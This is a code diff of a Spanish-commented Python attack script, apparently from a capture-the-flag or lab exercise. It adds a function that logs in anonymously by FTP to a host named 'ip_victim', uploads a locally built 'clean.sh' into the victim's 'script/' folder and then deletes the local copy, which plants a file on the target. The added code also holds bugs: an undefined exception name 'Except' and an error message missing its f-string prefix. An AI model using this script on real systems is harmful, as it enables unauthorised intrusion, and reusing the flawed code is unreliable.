@@ -28,10 +28,21 @@ else:
   print("Hubo un error al crear el archivo clean.sh")
   exit(1)
 
+def upload_the_file_to_the_server(server, local_file, remote_file):
+  try:
+    with FTP(server) as ftp:
+      ftp.login()
+      with open(local_file, 'rb') as file:
+        ftp.storbinary(f'STOR {remote_file}', file)
+      print('Archivo subido correctamente al servidor FTP...')
+      os.remove('clean.sh')
+  except Except as e:
+    print('Error al subir el archivo al servidor FTP: {e}')
+
 # configurar los parámetros de conexión y archivos:
 server_ftp = ip_victim
 local_file = 'clean.sh'
-remote_file = 'script/clean.sh'
+remote_file = 'script/clean.sh' #ruta donde se subirá el archivo a la máquina victima
 
 # llamar a la función para subir el archivo:
 upload_the_file_to_the_server(server_ftp, local_file, remote_file)
